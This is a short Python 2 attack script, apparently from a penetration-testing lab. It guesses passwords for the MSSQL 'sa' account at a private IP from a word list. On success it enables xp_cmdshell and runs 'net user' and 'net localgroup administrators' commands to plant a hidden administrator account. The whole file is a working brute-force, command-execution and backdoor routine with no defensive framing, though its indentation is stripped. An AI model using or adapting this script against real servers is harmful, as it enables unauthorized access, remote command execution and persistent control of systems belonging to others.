#!/usr/bin/python

import _mssql

# mssql = _mssql.connect('ip', 'username', 'password')
# mssql.execute_query()

passwords = file("pass.txt", "r")
ip = "192.168.200.128"

for password in passwords:
password = password.rstrip()
try:
mssql = _mssql.connect(ip, "sa", password)

print "[*] Successful login with username 'sa' and password: " + password
print "[*] Enabling 'xp_cmdshell'"
mssql.execute_query("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE;")
mssql.execute_query("RECONFIGURE;")

print "[*] Adding Administrative user"
mssql.execute_query("xp_cmdshell 'net user netbiosX Password! /ADD && net localgroup administrators netbiosX /ADD'")
mssql.close()

print "[*] Success!"
break

except:
print "[!] Failed login for username 'sa' and password: " + password
